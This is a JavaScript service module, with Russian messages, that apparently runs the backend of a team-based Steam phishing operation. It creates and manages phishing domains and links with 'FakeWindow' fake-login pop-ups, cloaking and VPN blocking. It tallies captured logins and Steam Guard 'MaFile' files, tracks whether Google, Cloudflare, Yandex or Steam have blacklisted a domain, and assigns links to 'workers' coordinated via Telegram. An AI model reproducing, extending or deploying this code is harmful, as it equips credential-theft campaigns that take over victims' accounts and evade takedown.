const {
  getPanelToken,
  filterAvailableDomains,
} = require("../handlers/sitesHandler");
const {
  getDomains,
  getTeamDomains,
  checkDomainAvailability,
  getActualIPs,
  createDomain,
  deleteDomain,
  getSteamLinks,
  filterActiveSteamLinks,
  findTemplateById,
  createSteamLink,
  updateSteamLink,
  deleteSteamLink,
  getTeamWorkers,
  formatPanelError,
  normalizeWindowType,
  authCredentials,
} = require("./apiService");
const {
  clearTeamReferralForDomain,
  listTeamReferralsFromDb,
  getUserByTelegramId,
  getTeamReferralForDomain,
} = require("./userService");
const {
  getVisibleTemplates,
  addVisibleTemplate,
  removeVisibleTemplate,
  renameVisibleTemplate,
  isTemplateVisible,
  normalizeTemplateId,
} = require("./settingsService");
const { logger } = require("../utils/logger");
const { mergeDeviceCounts } = require("../utils/referral");

function pickActualIp(ips) {
  if (Array.isArray(ips)) return ips[0] || "";
  if (typeof ips === "string") return ips;
  return ips?.ip || ips?.[0] || "";
}

function sumStatCounts(stats = []) {
  const out = {};
  for (const row of Array.isArray(stats) ? stats : []) {
    const action = row?.action || "Unknown";
    out[action] = (out[action] || 0) + (Number(row?.count) || 0);
  }
  return out;
}

function mergeCountryCounts(stats = []) {
  const out = {};
  for (const row of Array.isArray(stats) ? stats : []) {
    const countries = row?.countries || row?.countryCounts || null;
    if (!countries || typeof countries !== "object" || Array.isArray(countries)) continue;
    for (const [code, count] of Object.entries(countries)) {
      const key = String(code || "").trim().toUpperCase();
      if (!key) continue;
      out[key] = (out[key] || 0) + (Number(count) || 0);
    }
  }
  return out;
}

function serializeCountMap(map, limit = 12) {
  return Object.entries(map || {})
    .map(([name, count]) => ({ name, count: Number(count) || 0 }))
    .filter((row) => row.name && row.count > 0)
    .sort((a, b) => b.count - a.count)
    .slice(0, limit);
}

function serializeDomainStats(stats) {
  const counts = sumStatCounts(stats);
  return {
    views: counts.PageVisit || 0,
    clicks: counts.AuthVisit || 0,
    auths: counts.AuthVisit || 0,
    logs: counts.Log || 0,
    mafiles: counts.MaFile || 0,
  };
}

function aggregateLinkStats(links = []) {
  const merged = [];
  for (const link of links) {
    if (Array.isArray(link?.stats)) merged.push(...link.stats);
  }
  return serializeDomainStats(merged);
}

function isDomainPaused(domain) {
  return String(domain?.status || "").toLowerCase() === "pause";
}

function extractOwnerIdFromToken(token) {
  try {
    const payload = JSON.parse(Buffer.from(String(token).split(".")[1], "base64url").toString("utf8"));
    const id = Number(payload?.id);
    return Number.isFinite(id) ? id : null;
  } catch (_) {
    return null;
  }
}

function serializeBanCheck(value) {
  const raw = String(value || "NoInfo");
  return {
    raw,
    banned: raw === "Banned",
    clean: raw === "NotBanned",
  };
}

function serializeBanData(banData) {
  if (!banData || typeof banData !== "object") return null;
  let updatedAt = null;
  const ts = Number(banData.updatedAt);
  if (Number.isFinite(ts) && ts > 0) {
    const date = new Date(ts > 1e12 ? ts : ts * 1000);
    if (!Number.isNaN(date.getTime())) updatedAt = date.toISOString();
  }
  return {
    updatedAt,
    whois: serializeBanCheck(banData.bannedAtWhois),
    cloudflare: serializeBanCheck(banData.bannedAtCloudFlare),
    google: serializeBanCheck(banData.bannedAtChrome),
    yandex: serializeBanCheck(banData.bannedAtYandex),
    steam: serializeBanCheck(banData.bannedAtSteam),
  };
}

function serializeDomain(domain, ownerId = null) {
  if (!domain || typeof domain !== "object") {
    return {
      id: null,
      domain: "",
      online: 0,
      owner: null,
      isOwn: false,
      isTeamPublic: false,
      ip: "",
      service: "Steam",
      status: "",
      isPaused: false,
      createdAt: null,
      linksCount: 0,
      stats: serializeDomainStats([]),
      ns: [],
      banChecks: null,
    };
  }
  const own =
    ownerId != null && Number.isFinite(Number(ownerId))
      ? Number(domain.owner) === Number(ownerId)
      : Boolean(domain.isOwner);
  const status = String(domain.status || "");
  return {
    id: domain.id,
    domain: domain.domain || "",
    online: Number(domain.online || 0),
    owner: domain.owner ?? null,
    isOwn: own,
    isTeamPublic: domain.isTeamPublic === true || domain.isPublic === true,
    ip: domain.ip || "",
    service: domain.service || "Steam",
    status,
    isPaused: status.toLowerCase() === "pause",
    createdAt: domain.createdAt || null,
    linksCount: Number(domain.linksCount || 0),
    stats: serializeDomainStats(domain.stats),
    ns: domain.ns || [],
    banChecks: serializeBanData(domain.banData),
  };
}

function serializeLink(link, domainPaused = false) {
  if (!link || typeof link !== "object") return null;
  const template = link.template;
  const templateId =
    template && typeof template === "object"
      ? template.id
      : link.templateId ?? template ?? null;
  const templateName =
    (template && typeof template === "object" && template.name) ||
    link.templateName ||
    "";
  const steam = link.steam && typeof link.steam === "object" ? link.steam : {};
  const linkStatus = String(link.status || "").toLowerCase();
  const rawStats = Array.isArray(link.stats) ? link.stats : [];
  return {
    id: link.id,
    path: link.path || "",
    url: link.url || link.link || "",
    windowType: link.windowType || "",
    template: templateId,
    templateName,
    owner: link.owner ?? null,
    online: Number(link.online || 0),
    stats: serializeDomainStats(rawStats),
    iframe: Boolean(link.iframe),
    cloaking: Boolean(link.cloaking),
    ban_vpn: Boolean(link.ban_vpn),
    randPath: Boolean(link.randPath),
    isPaused: domainPaused || linkStatus === "pause",
    devices: serializeCountMap(mergeDeviceCounts(rawStats)),
    countries: serializeCountMap(mergeCountryCounts(rawStats)),
    steam: {
      logError: (steam.logError ?? link.logError) !== false,
      tradeError: (steam.tradeError ?? link.tradeError) !== false,
      mafileError: Boolean(steam.mafileError ?? link.mafileError),
      mafileSteamRedirect:
        (steam.mafileSteamRedirect ?? link.mafileSteamRedirect) !== false,
    },
  };
}

async function withAdminPanel(adminUser, fn) {
  try {
    const auth = await getPanelToken(adminUser);
    return await fn(auth);
  } catch (error) {
    const err = new Error(formatPanelError(error) || error.message || "sites_error");
    err.status = error?.response?.status || 400;
    throw err;
  }
}

async function withWorkerPanel(user, fn) {
  if (!user?.panelUsername || !user?.panelPassword) {
    const err = new Error("У воркера нет аккаунта панели сайтов");
    err.status = 400;
    throw err;
  }
  try {
    const auth = await authCredentials(user.panelUsername, user.panelPassword);
    if (!auth?.token) {
      const err = new Error("Не удалось авторизовать аккаунт воркера в панели");
      err.status = 400;
      throw err;
    }
    return await fn({ token: auth.token, user });
  } catch (error) {
    if (error.status) throw error;
    const err = new Error(formatPanelError(error) || error.message || "sites_error");
    err.status = error?.response?.status || 400;
    throw err;
  }
}

/** Список доменов — team key + фильтр доступных воркеру.
 *  options.light — без подгрузки ссылок (для алертов)
 *  options.includeLinks — отдать сериализованные ссылки (для аналитики одним запросом)
 */
async function listDomains(user, options = {}) {
  const light = options.light === true;
  const includeLinks = options.includeLinks === true;
  try {
    const payload = await getTeamDomains(0, 50);
    let ownerId = null;
    let panelUsername = user?.panelUsername || "team";

    if (user?.panelUsername && user?.panelPassword) {
      try {
        const auth = await authCredentials(user.panelUsername, user.panelPassword);
        ownerId = extractOwnerIdFromToken(auth.token);
        panelUsername = user.panelUsername;
      } catch (_) {
        // fallback: все публичные домены команды
      }
    }

    let rows = payload?.rows || [];
    if (ownerId == null) {
      // Без аккаунта панели сайтов не отдаём полный team dump.
      rows = (payload?.rows || []).filter(
        (row) => row?.isPublic === true || row?.isTeamPublic === true
      );
    } else {
      rows = filterAvailableDomains(rows, ownerId);
    }

    let domains = rows.map((d) => serializeDomain(d, ownerId));

    if (!light && user?.panelUsername && user?.panelPassword && ownerId != null) {
      try {
        domains = await withWorkerPanel(user, async ({ token }) => {
          const workerId = extractOwnerIdFromToken(token) ?? ownerId;
          return Promise.all(
            domains.map(async (row) => {
              try {
                const linksPayload = await getSteamLinks(token, row.id, 0, 100);
                const myLinks = filterActiveSteamLinks(linksPayload?.rows || []).filter(
                  (link) => Number(link.owner) === Number(workerId)
                );
                const domainPaused = Boolean(row.isPaused);
                const serializedLinks = myLinks
                  .map((link) => serializeLink(link, domainPaused))
                  .filter(Boolean);
                return {
                  ...row,
                  linksCount: myLinks.length,
                  stats: aggregateLinkStats(myLinks),
                  online: myLinks.reduce((sum, link) => sum + Number(link.online || 0), 0),
                  ...(includeLinks ? { links: serializedLinks } : {}),
                };
              } catch {
                return {
                  ...row,
                  linksCount: 0,
                  stats: serializeDomainStats([]),
                  online: 0,
                  ...(includeLinks ? { links: [] } : {}),
                };
              }
            })
          );
        });
      } catch (_) {
        // team key list без персональной статистики
      }
    }

    return {
      ownerId,
      panelUsername,
      totalOnline: domains.reduce((sum, row) => sum + row.online, 0),
      ownCount: domains.filter((row) => row.isOwn).length,
      domains,
      viaTeamKey: true,
    };
  } catch (error) {
    const err = new Error(formatPanelError(error) || error.message || "sites_error");
    err.status = error?.response?.status || 400;
    throw err;
  }
}

async function resolveDomainMap() {
  const payload = await getTeamDomains(0, 100);
  const map = new Map();
  for (const row of payload?.rows || []) {
    map.set(Number(row.id), row);
  }
  return map;
}

async function getWorkerDomainDetail(user, domainId) {
  const domainMap = await resolveDomainMap();
  const domain = domainMap.get(Number(domainId));
  if (!domain) {
    const err = new Error("Домен недоступен");
    err.status = 404;
    throw err;
  }

  if (!user?.panelUsername || !user?.panelPassword) {
    const err = new Error("У воркера нет аккаунта панели сайтов");
    err.status = 400;
    throw err;
  }

  const domainPaused = isDomainPaused(domain);

  return withWorkerPanel(user, async ({ token }) => {
    const ownerId = extractOwnerIdFromToken(token);
    const available = filterAvailableDomains([domain], ownerId);
    if (!available.length) {
      const err = new Error("Домен недоступен");
      err.status = 404;
      throw err;
    }

    const linksPayload = await getSteamLinks(token, domainId, 0, 100);
    const myLinks = filterActiveSteamLinks(linksPayload?.rows || []).filter(
      (link) => Number(link.owner) === Number(ownerId)
    );
    const workerOnline = myLinks.reduce((sum, link) => sum + Number(link.online || 0), 0);
    const links = myLinks
      .map((link) => serializeLink(link, domainPaused))
      .filter(Boolean);

    return {
      ownerId,
      domain: {
        ...serializeDomain(domain, ownerId),
        linksCount: links.length,
        stats: aggregateLinkStats(myLinks),
        online: workerOnline,
        bindType: Array.isArray(domain.ns) && domain.ns.length ? "cloudflare" : "ip",
        bindNs: domain.ns || [],
      },
      links,
    };
  });
}

async function getDomainDetail(adminUser, domainId) {
  const domainMap = await resolveDomainMap();
  const domain = domainMap.get(Number(domainId));
  if (!domain) {
    const err = new Error("Домен недоступен");
    err.status = 404;
    throw err;
  }

  let ownerLinks = [];
  try {
    await withAdminPanel(adminUser, async ({ token }) => {
      const linksPayload = await getSteamLinks(token, domainId, 0, 100);
      ownerLinks = filterActiveSteamLinks(linksPayload?.rows || [])
        .map((link) => serializeLink(link, isDomainPaused(domain)))
        .filter(Boolean);
    });
  } catch (_) {
    // Админ без панели — только рефералки из Mongo.
  }

  const referrals = (await listTeamReferralsFromDb()).filter(
    (row) => Number(row.domainId) === Number(domainId)
  );

  return {
    ownerId: null,
    domain: serializeDomain(domain, null),
    links: ownerLinks,
    referrals: referrals.map((row) => ({
      ...row,
      domainName: domain.domain || "",
      url: `${domain.domain || ""}/${String(row.path || "").replace(/^\/+/, "")}`,
    })),
  };
}

async function previewAddDomain(adminUser, domainName) {
  const domain = String(domainName || "")
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, "")
    .replace(/\/.*$/, "");
  if (!domain || !/^[a-z0-9.-]+\.[a-z]{2,}$/i.test(domain)) {
    const err = new Error("Укажите корректный домен, например example.com");
    err.status = 400;
    throw err;
  }
  return withAdminPanel(adminUser, async ({ token }) => {
    const check = await checkDomainAvailability(token, domain);
    if (!check.available) {
      const err = new Error(check.message || "Домен недоступен или уже занят");
      err.status = 409;
      throw err;
    }
    const ip = pickActualIp(await getActualIPs(token));
    return { domain, ip, available: true };
  });
}

async function addDomain(adminUser, domainName) {
  const preview = await previewAddDomain(adminUser, domainName);
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const created = await createDomain(token, {
      domain: preview.domain,
      type: "IP",
      service: "Steam",
      isPublic: false,
      isTransit: false,
    });
    return {
      created: serializeDomain(
        {
          id: created?.id || created?.data?.id,
          domain: created?.domain || preview.domain,
          online: 0,
          owner: ownerId,
          ip: created?.ip || preview.ip,
          service: "Steam",
        },
        ownerId
      ),
      bindIp: preview.ip,
    };
  });
}

async function removeDomain(adminUser, domainId) {
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const payload = await getDomains(token, 0, 50);
    const domain = (payload?.rows || []).find((row) => Number(row.id) === Number(domainId));
    if (!domain) {
      const err = new Error("Домен не найден");
      err.status = 404;
      throw err;
    }
    if (Number(domain.owner) !== Number(ownerId)) {
      const err = new Error("Можно удалить только свой домен");
      err.status = 403;
      throw err;
    }
    await deleteDomain(token, domainId);
    await clearTeamReferralForDomain(adminUser.telegramId, domainId);
    return { ok: true };
  });
}

async function listTemplates(_adminUser) {
  const templates = await getVisibleTemplates();
  return {
    templates: templates.map((t) => ({
      id: t.id,
      name: t.name || `Template #${t.id}`,
      preview: t.preview || "",
    })),
  };
}

async function listTemplateVisibility(_adminUser) {
  const templates = await getVisibleTemplates();
  return {
    templates: templates.map((t) => ({
      id: t.id,
      name: t.name || `Template #${t.id}`,
      preview: t.preview || "",
      enabled: true,
    })),
  };
}

async function enableTemplateById(adminUser, templateId, { name } = {}) {
  const id = normalizeTemplateId(templateId);
  if (!id) {
    const err = new Error("Укажите корректный ID шаблона");
    err.status = 400;
    throw err;
  }
  const customName = String(name || "").trim().slice(0, 80);
  let found = null;
  try {
    found = await withAdminPanel(adminUser, async ({ token }) => findTemplateById(token, id));
  } catch {
    // Можно включить ID без каталога uproject — имя подставится позже.
  }
  const templates = await addVisibleTemplate({
    id,
    name: customName || found?.name || `Template #${id}`,
    preview: found?.preview || "",
  });
  return {
    templates,
    template: templates.find((row) => row.id === id),
    resolved: Boolean(found),
    customName: Boolean(customName),
  };
}

async function renameTemplateById(_adminUser, templateId, name) {
  try {
    const templates = await renameVisibleTemplate(templateId, name);
    const id = normalizeTemplateId(templateId);
    return {
      templates,
      template: templates.find((row) => row.id === id),
    };
  } catch (error) {
    const err = new Error(error.message || "Не удалось переименовать");
    err.status = 400;
    throw err;
  }
}

async function disableTemplateById(_adminUser, templateId) {
  const id = normalizeTemplateId(templateId);
  if (!id) {
    const err = new Error("Укажите корректный ID шаблона");
    err.status = 400;
    throw err;
  }
  const templates = await removeVisibleTemplate(id);
  return { templates };
}

async function createWorkerLink(user, domainId, options = {}) {
  return withWorkerPanel(user, async ({ token }) => {
    const ownerId = extractOwnerIdFromToken(token);
    const payload = await getDomains(token, 0, 50);
    const domain = filterAvailableDomains(payload?.rows || [], ownerId).find(
      (row) => Number(row.id) === Number(domainId)
    );
    if (!domain) {
      const err = new Error("Домен недоступен");
      err.status = 404;
      throw err;
    }
    if (isDomainPaused(domain)) {
      const err = new Error("Домен на паузе — нельзя создавать или редактировать ссылки");
      err.status = 403;
      throw err;
    }
    const tpl = Number(options.templateId);
    if (!Number.isFinite(tpl) || tpl < 1) {
      const err = new Error("Выберите шаблон");
      err.status = 400;
      throw err;
    }
    if (!(await isTemplateVisible(tpl))) {
      const err = new Error("Шаблон недоступен. Включите его ID в разделе «Шаблоны».");
      err.status = 400;
      throw err;
    }
    const cleanPath = String(options.path || "").trim().replace(/^\/+/, "");
    const hasPath = Boolean(cleanPath);
    const created = await createSteamLink(token, {
      path: cleanPath,
      windowType: normalizeWindowType(options.windowType || "FakeWindow"),
      domain: Number(domainId),
      template: tpl,
      cloaking: Boolean(options.cloaking),
      ban_vpn: Boolean(options.ban_vpn),
      iframe: options.iframe !== false,
      logError: options.logError !== false,
      mafileError: Boolean(options.mafileError),
      mafileSteamRedirect: options.mafileSteamRedirect !== false,
      tradeError: options.tradeError !== false,
      randPath: options.randPath != null ? Boolean(options.randPath) : !hasPath,
    });
    return {
      link: serializeLink(created?.data || created || {}, isDomainPaused(domain)),
    };
  });
}

async function updateWorkerLink(user, domainId, linkId, options = {}) {
  return withWorkerPanel(user, async ({ token }) => {
    const ownerId = extractOwnerIdFromToken(token);
    const payload = await getDomains(token, 0, 50);
    const domain = filterAvailableDomains(payload?.rows || [], ownerId).find(
      (row) => Number(row.id) === Number(domainId)
    );
    if (!domain) {
      const err = new Error("Домен недоступен");
      err.status = 404;
      throw err;
    }
    const linksPayload = await getSteamLinks(token, domainId, 0, 100);
    const link = filterActiveSteamLinks(linksPayload?.rows || []).find(
      (row) => Number(row.id) === Number(linkId) && Number(row.owner) === Number(ownerId)
    );
    if (!link) {
      const err = new Error("Ссылка не найдена");
      err.status = 404;
      throw err;
    }

    const tpl = Number(options.templateId);
    if (!Number.isFinite(tpl) || tpl < 1) {
      const err = new Error("Выберите шаблон");
      err.status = 400;
      throw err;
    }
    if (!(await isTemplateVisible(tpl))) {
      const err = new Error("Шаблон недоступен. Включите его ID в разделе «Шаблоны».");
      err.status = 400;
      throw err;
    }

    const patch = {
      windowType: normalizeWindowType(options.windowType || link.windowType),
      template: tpl,
      iframe: options.iframe !== false,
      cloaking: Boolean(options.cloaking),
      logError: options.logError !== false,
      mafileError: Boolean(options.mafileError),
      mafileSteamRedirect: options.mafileSteamRedirect !== false,
      tradeError: options.tradeError !== false,
    };
    if (options.path !== undefined) {
      patch.path = String(options.path || "").trim().replace(/^\/+/, "");
    }

    const updated = await updateSteamLink(token, domainId, linkId, patch);
    return {
      link: serializeLink(updated?.data || updated || link, isDomainPaused(domain)),
    };
  });
}

async function deleteWorkerLink(user, domainId, linkId) {
  return withWorkerPanel(user, async ({ token }) => {
    const ownerId = extractOwnerIdFromToken(token);
    const linksPayload = await getSteamLinks(token, domainId, 0, 100);
    const link = filterActiveSteamLinks(linksPayload?.rows || []).find(
      (row) => Number(row.id) === Number(linkId) && Number(row.owner) === Number(ownerId)
    );
    if (!link) {
      const err = new Error("Ссылка не найдена");
      err.status = 404;
      throw err;
    }
    await deleteSteamLink(token, domainId, linkId, {
      windowType: link.windowType || "FakeWindow",
    });
    return { ok: true };
  });
}

async function createLink(adminUser, domainId, options = {}) {
  return withAdminPanel(adminUser, async ({ token, ownerId }) => {
    const payload = await getDomains(token, 0, 50);
    const domain = filterAvailableDomains(payload?.rows || [], ownerId).find(
      (row) => Number(row.id) === Number(domainId)
    );
    if (!domain) {
      const err = new Error("Домен недоступен");
      err.status = 404;
      throw err;
    }
    if (isDomainPaused(domain)) {
      const err = new Error("Домен на паузе — нельзя создавать или редактировать ссылки");
      err.status = 403;
      throw err;
    }
    const tpl = Number(options.templateId);
    if (!Number.isFinite(tpl) || tpl < 1) {
      const err = new Error("Выберите шаблон");
      err.status = 400;
      throw err;
    }
    if (!(await isTemplateVisible(tpl))) {
      const err = new Error("Шаблон недоступен. Включите его ID в разделе «Шаблоны».");
      err.status = 400;
      throw err;
    }
    const cleanPath = String(options.path || "").trim().replace(/^\/+/, "");
    const hasPath = Boolean(cleanPath);
    const created = await createSteamLink(token, {
      path: cleanPath,
      windowType: normalizeWindowType(options.windowType || "FakeWindow"),
      domain: Number(domainId),
      template: tpl,
      cloaking: Boolean(options.cloaking),
      ban_vpn: Boolean(options.ban_vpn),
      iframe: options.iframe !== false,
      logError: options.logError !== false,
      mafileError: Boolean(options.mafileError),
      mafileSteamRedirect: options.mafileSteamRedirect !== false,
      tradeError: options.tradeError !== false,
      randPath: options.randPath != null ? Boolean(options.randPath) : !hasPath,
    });
    return {
      link: serializeLink(created?.data || created || {}, isDomainPaused(domain)),
    };
  });
}

async function listWorkers(adminUser) {
  try {
    return await withAdminPanel(adminUser, async ({ token, ownerId }) => {
      const payload = await getTeamWorkers(token, 0, 100);
      const rows = (payload?.rows || []).map((row) => ({
        id: row.id,
        username: row.username || "",
        telegram: row.telegram || "",
        isOwner: Number(row.id) === Number(ownerId),
      }));
      return { ownerId, workers: rows };
    });
  } catch (error) {
    // Fallback: воркеры из Mongo с рефералками / panel-аккаунтами.
    const referrals = await listTeamReferralsFromDb();
    const byTg = new Map();
    for (const row of referrals) {
      if (!byTg.has(row.telegramId)) {
        byTg.set(row.telegramId, {
          id: null,
          username: row.panelUsername || row.username || "",
          telegram: row.telegramId,
          isOwner: false,
        });
      }
    }
    return { ownerId: null, workers: [...byTg.values()], viaMongo: true };
  }
}

async function listTeamReferrals(_adminUser) {
  const [items, domainMap] = await Promise.all([
    listTeamReferralsFromDb(),
    resolveDomainMap().catch(() => new Map()),
  ]);
  const templates = await getVisibleTemplates();
  const referrals = items.map((row) => {
    const domain = domainMap.get(Number(row.domainId));
    const domainName = domain?.domain || "";
    return {
      ...row,
      domainName,
      url: domainName
        ? `${domainName}/${String(row.path || "").replace(/^\/+/, "")}`
        : String(row.path || ""),
      online: Number(domain?.online || 0),
    };
  });
  return {
    total: referrals.length,
    referrals,
    templates: templates.map((t) => ({
      id: t.id,
      name: t.name || `Template #${t.id}`,
    })),
  };
}

async function updateTeamReferral(
  _adminUser,
  { telegramId, domainId },
  { templateId, windowType } = {}
) {
  const user = await getUserByTelegramId(telegramId);
  if (!user) {
    const err = new Error("Воркер не найден");
    err.status = 404;
    throw err;
  }
  const existing = await getTeamReferralForDomain(telegramId, domainId);
  if (!existing?.panelLinkId) {
    const err = new Error("Реферальная ссылка не найдена");
    err.status = 404;
    throw err;
  }

  const patch = {};
  if (templateId != null && templateId !== "") {
    const tpl = Number(templateId);
    if (!Number.isFinite(tpl) || tpl < 1) {
      const err = new Error("Некорректный ID шаблона");
      err.status = 400;
      throw err;
    }
    if (!(await isTemplateVisible(tpl))) {
      const err = new Error("Шаблон недоступен. Включите его в разделе «Шаблоны».");
      err.status = 400;
      throw err;
    }
    patch.template = tpl;
  }
  if (windowType) patch.windowType = normalizeWindowType(windowType);
  if (!Object.keys(patch).length) {
    const err = new Error("Нечего обновлять");
    err.status = 400;
    throw err;
  }

  return withWorkerPanel(user, async ({ token }) => {
    let liveWindow = patch.windowType;
    if (!liveWindow) {
      try {
        const links = await getSteamLinks(token, domainId, 0, 50);
        const row = (links?.rows || []).find(
          (link) => Number(link.id) === Number(existing.panelLinkId)
        );
        liveWindow = row?.windowType;
      } catch (_) {
        /* ignore */
      }
    }
    await updateSteamLink(token, domainId, existing.panelLinkId, {
      ...patch,
      windowType: normalizeWindowType(liveWindow || "FakeWindow"),
    });
    return { ok: true, telegramId: String(telegramId), domainId: Number(domainId), patch };
  });
}

async function deleteTeamReferral(_adminUser, { telegramId, domainId }) {
  const user = await getUserByTelegramId(telegramId);
  if (!user) {
    const err = new Error("Воркер не найден");
    err.status = 404;
    throw err;
  }
  const existing = await getTeamReferralForDomain(telegramId, domainId);
  if (!existing) {
    const err = new Error("Реферальная ссылка не найдена");
    err.status = 404;
    throw err;
  }

  if (existing.panelLinkId && user.panelUsername && user.panelPassword) {
    try {
      await withWorkerPanel(user, async ({ token }) => {
        let windowType = "FakeWindow";
        try {
          const links = await getSteamLinks(token, domainId, 0, 50);
          const row = (links?.rows || []).find(
            (link) => Number(link.id) === Number(existing.panelLinkId)
          );
          if (row?.windowType) windowType = row.windowType;
        } catch (_) {
          /* ignore */
        }
        await deleteSteamLink(token, domainId, existing.panelLinkId, { windowType });
      });
    } catch (error) {
      logger.warn(
        "Failed to soft-delete panel referral link",
        telegramId,
        domainId,
        error.message
      );
    }
  }

  await clearTeamReferralForDomain(telegramId, domainId);
  return { ok: true, telegramId: String(telegramId), domainId: Number(domainId) };
}

module.exports = {
  listDomains,
  getWorkerDomainDetail,
  getDomainDetail,
  previewAddDomain,
  addDomain,
  removeDomain,
  listTemplates,
  listTemplateVisibility,
  enableTemplateById,
  renameTemplateById,
  disableTemplateById,
  createWorkerLink,
  updateWorkerLink,
  deleteWorkerLink,
  createLink,
  listWorkers,
  listTeamReferrals,
  updateTeamReferral,
  deleteTeamReferral,
};
